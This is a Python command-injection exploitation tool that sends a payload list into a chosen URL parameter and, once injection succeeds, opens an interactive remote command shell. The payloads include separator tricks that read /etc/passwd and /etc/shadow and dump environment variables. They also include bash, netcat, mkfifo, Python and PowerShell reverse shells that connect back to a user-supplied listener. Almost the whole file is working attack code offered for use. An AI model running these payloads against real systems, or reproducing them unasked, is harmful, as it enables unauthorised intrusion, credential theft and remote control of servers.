import requests
from urllib.parse import urlparse, parse_qs, urlencode
import sys

def get_listener_info():
    print("The LHOST and LPORT is used in some of the payloads!")
    your_ip = input("Enter your listener IP (LHOST): ").strip()
    your_port = input("Enter your listener port (LPORT): ").strip()
    return your_ip, your_port

def build_payloads(your_ip, your_port):
    return [
        "; id",
        "| id",
        "&& id",
        "|| id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "; uname -a",
        "; echo INJECTIONTEST",
        "; sleep 5",
        "| sleep 5",
        "; ping -c 1 127.0.0.1",
        "; cat /etc/passwd",
        "; cat /etc/shadow",
        "; ls -al /home",
        "; ps aux",
        "; netstat -an",
        "; ifconfig",
        "; hostname",
        "; env",
        "; set",
        # Bash reverse shell
        f"; bash -c 'bash -i >& /dev/tcp/{your_ip}/{your_port} 0>&1'",
        # Netcat reverse shell (traditional)
        f"; nc {your_ip} {your_port} -e /bin/bash",
        # Netcat reverse shell (mkfifo method)
        f"; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {your_ip} {your_port} >/tmp/f",
        # Python reverse shell
        f"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{your_ip}\",{your_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        # PowerShell reverse shell (Windows)
        f"; powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{your_ip}\",{your_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}",
        # Bypass filters
        "; id #",
        "| id #",
        "; id //",
        "`id`",
        "$(id)",
        "; id",
        "| id",
        "&& id",
        "|| id",
        "%0a id",
        "%0d id"
    ]

def test_injection(url, param, method='GET', marker='cmdinjtest', payloads=None):
    print("[*] Testing for OS command injection vulnerabilities...")
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    found = False

    for payload in payloads:
        # Insert marker for detection and replace 'id' with echo commands if present
        if 'id' in payload:
            test_payload = payload.replace('id', f'echo {marker}; id; echo {marker}')
        else:
            test_payload = f'1; echo {marker}; {payload.strip(";|&`$ ")}; echo {marker}'

        params[param] = test_payload
        if method == 'GET':
            new_query = urlencode(params, doseq=True)
            new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            try:
                resp = requests.get(new_url, verify=False, timeout=10)
            except Exception:
                continue
        else:
            data = {k: v[0] for k, v in params.items()}
            data[param] = test_payload
            try:
                resp = requests.post(url, data=data, verify=False, timeout=10)
            except Exception:
                continue

        if marker in resp.text:
            output = resp.text.split(marker)[1]
            print(f"\n[+] Vulnerable with payload: {repr(payload)}")
            print(f"    Command output:\n{output.strip()}")
            found = True
            break
        else:
            print(f"[-] Tried payload: {repr(payload)} -- Not vulnerable or no output detected.")

    return found

def interactive_shell(url, param, method='GET', marker='cmdinjtest'):
    print("\n[*] Enter commands to execute on the server. Type 'exit' to quit.")
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    while True:
        cmd = input("shell> ")
        if cmd.strip().lower() == 'exit':
            break
        injection = f'1; echo {marker}; {cmd}; echo {marker}'
        params[param] = injection
        if method == 'GET':
            new_query = urlencode(params, doseq=True)
            new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            try:
                resp = requests.get(new_url, verify=False, timeout=10)
            except Exception as e:
                print(f"Request error: {e}")
                continue
        else:
            data = {k: v[0] for k, v in params.items()}
            data[param] = injection
            try:
                resp = requests.post(url, data=data, verify=False, timeout=10)
            except Exception as e:
                print(f"Request error: {e}")
                continue

        if marker in resp.text:
            output = resp.text.split(marker)[1]
            print(output.strip())
        else:
            print("No command output detected.")

def main():
    print("Simple OS Command Injection Tester & Exploiter (with dynamic Netcat payloads)")
    your_ip, your_port = get_listener_info()
    payloads = build_payloads(your_ip, your_port)

    url = input("Enter target URL (with parameter): ").strip()
    method = input("HTTP method (GET/POST) [GET]: ").strip().upper() or 'GET'
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        print("No parameters found in URL. Please provide a URL with parameters.")
        sys.exit(1)
    print(f"Parameters found: {', '.join(params.keys())}")
    param = input("Parameter to test for injection: ").strip()
    if param not in params:
        print("Parameter not found in URL.")
        sys.exit(1)

    if test_injection(url, param, method, payloads=payloads):
        interactive_shell(url, param, method)
    else:
        print("No command injection vulnerability detected.")

if __name__ == "__main__":
    # Suppress SSL warnings for demo purposes
    requests.packages.urllib3.disable_warnings()
    main()
